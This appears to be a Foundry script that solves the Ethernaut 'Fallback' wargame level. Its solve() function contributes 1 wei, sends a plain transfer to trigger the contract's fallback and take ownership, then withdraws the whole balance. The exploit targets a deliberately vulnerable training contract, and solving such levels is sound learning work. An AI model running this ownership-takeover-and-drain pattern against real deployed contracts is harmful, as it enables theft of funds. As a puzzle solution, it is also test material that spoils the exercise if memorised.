pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IFallback {
    function owner() external view returns (address);

    function contribute() external payable;

    function getContribution() external view returns (uint256);

    function withdraw() external;
}

contract Ethernaut01 is EthernautTest {
    function setUp() public {
        initialize(address(0x9CB391dbcD447E645D6Cb55dE6ca23164130D008));
    }

    function run() public {
        setUp();
        deploy();
        solve();
        submit(me);
    }

    function test() public {
        testMode = true;
        deploy();
        solve();
        submit(me);
    }

    function solve() internal {
        broadcastOrPrank();
        IFallback(instance).contribute{value: 1}();

        broadcastOrPrank();
        instance.call{value: 1}("");

        broadcastOrPrank();
        IFallback(instance).withdraw();

        require(instance.balance == 0);
    }

    fallback() external payable {}
}
